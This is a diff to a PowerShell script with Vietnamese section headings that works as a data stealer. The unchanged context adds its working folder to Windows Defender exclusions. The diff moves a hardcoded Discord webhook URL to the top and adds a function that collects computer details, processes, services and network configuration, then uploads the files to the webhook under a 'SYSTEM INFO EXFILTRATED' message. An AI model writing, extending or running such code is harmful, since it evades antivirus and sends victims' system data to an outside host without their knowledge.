@@ -8,7 +8,7 @@
 # ============================================
 # PHẦN 1: KHỞI TẠO
 # ============================================
-
+$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 $basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 
@@ -21,6 +21,27 @@ try {
     Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 } catch {}
 
+# Gather additional system information
+function GatherSystemInfo {
+    $sysInfoDir = "$dumpFolder\SystemInfo"
+    if (-Not (Test-Path $sysInfoDir)) {
+        New-Item -ItemType Directory -Path $sysInfoDir -Force | Out-Null
+    }
+
+    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
+    if ($hookurl) {
+        $body = @{ content = "**SYSTEM INFO EXFILTRATED**`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" } | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
+        
+        Get-ChildItem "$sysInfoDir" -File | ForEach-Object {
+            curl.exe -F "file1=@$($_.FullName)" $hookurl 2>$null
+            Start-Sleep -Seconds 1
+        }
+    }
+}
 # ============================================
 # PHẦN 2: TẢI VÀ GIẢI NÉN TOOLS
 # ============================================
@@ -60,7 +81,7 @@ foreach ($file in $filesToMove) {
 # PHẦN 5: DISCORD WEBHOOK
 # ============================================
 
-$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
+
 
 # ============================================
 # PHẦN 6: GỬI TỪNG FILE TXT QUA DISCORD
